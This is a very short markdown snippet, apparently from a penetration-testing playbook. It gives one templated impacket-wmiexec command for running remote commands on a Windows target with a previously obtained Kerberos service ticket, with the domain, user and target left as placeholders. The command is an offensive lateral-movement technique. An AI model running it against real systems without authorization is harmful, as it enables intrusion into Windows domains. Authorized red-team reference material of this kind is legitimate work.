---
title: Command context
---

## Ticket access

Run on Kali after obtaining a service ticket. Confirm the returned identity.

```bash
impacket-wmiexec -k -no-pass '{{DOMAIN}}/{{USER}}'@'{{TARGET_COMPUTER}}'
```
